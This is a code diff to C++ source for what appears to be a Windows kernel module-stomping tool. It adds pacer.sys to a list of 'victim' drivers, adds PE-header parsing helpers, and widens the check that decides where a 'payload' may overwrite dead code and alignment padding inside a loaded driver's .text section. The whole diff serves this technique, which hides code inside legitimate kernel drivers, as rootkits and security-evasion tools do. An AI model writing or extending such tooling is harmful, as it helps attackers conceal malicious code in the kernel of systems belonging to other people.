@@ -23,6 +23,8 @@ static const struct { const wchar_t* key; const wchar_t* mod; const wchar_t* dos
     { L"dam", L"dam.sys", L"\\\\.\\Dam" },
     { L"luafv", L"luafv.sys", L"\\\\.\\Luafv" },
     { L"wcifs", L"wcifs.sys", L"\\\\.\\WCIFS" },
+    { L"pacer", L"pacer.sys", L"\\\\.\\Psched" },
+    { L"psched", L"pacer.sys", L"\\\\.\\Psched" },
 };
 
 bool VictimBlockedForLiveStomp(const wchar_t* shortName)
@@ -73,6 +75,15 @@ uint32_t PeSizeOfImage(const std::vector<uint8_t>& payloadFile)
     return RdU32(payloadFile.data() + pe + 24 + 56);
 }
 
+uint32_t PeSizeOfHeaders(const std::vector<uint8_t>& payloadFile)
+{
+    if (payloadFile.size() < 0x200) return 0;
+    uint32_t pe = RdU32(payloadFile.data() + 0x3C);
+    if (pe + 0x120 > payloadFile.size()) return 0;
+    if (RdU32(payloadFile.data() + pe) != 0x4550) return 0;
+    return RdU32(payloadFile.data() + pe + 24 + 60);
+}
+
 struct SYSMOD {
     ULONG r1[2];
     ULONG_PTR image_base;
@@ -114,6 +125,8 @@ static bool LoadVictimPeFile(const std::wstring& diskPath, VictimImage& out, con
     if (RdU32(nth) != 0x4550) return false;
     out.preferred_base = RdU64(nth + 24 + 24);
     out.image_size = RdU32(nth + 24 + 56);
+    out.section_align = RdU32(nth + 24 + 32);
+    if (out.section_align < 0x200) out.section_align = 0x1000;
     WORD nsec = *(const WORD*)(nth + 6);
     WORD optSz = *(const WORD*)(nth + 20);
     const uint8_t* sec = nth + 24 + optSz;
@@ -272,15 +285,23 @@ static bool PlanThunkOutsideCluster(const std::vector<DeadFunc>& byRva, uint32_t
                                     uint32_t clNeed, StompPlan& out);
 
 // Live map gate: every byte must be dead code or 0xCC on disk (no live .text).
+static uint32_t TextMapEnd(const VictimImage& img)
+{
+    uint32_t a = img.section_align ? img.section_align : 0x1000;
+    return AlignUp32(img.text_rva + img.text_vsize, a);
+}
+
 static bool PlacementRegionStrict(const VictimImage& img, uint32_t startRva, uint32_t size)
 {
     if (!size || startRva < img.text_rva) return false;
-    uint32_t off = startRva - img.text_rva;
-    if (off + size > img.text_vsize) return false;
+    uint32_t virtEnd = img.text_rva + img.text_vsize;
+    uint32_t mapEnd = TextMapEnd(img);
+    if (startRva + size > mapEnd) return false;
     const uint8_t* b = img.raw.data();
     uint32_t rawEnd = img.text_raw_ptr + (img.text_raw_size < img.text_vsize ? img.text_raw_size : img.text_vsize);
     for (uint32_t i = 0; i < size; ++i) {
         uint32_t rva = startRva + i;
+        if (rva >= virtEnd && rva < mapEnd) continue;
         bool inDead = false;
         for (const auto& d : img.dead_funcs) {
             if (rva >= d.rva_start && rva < d.rva_start + d.size) {
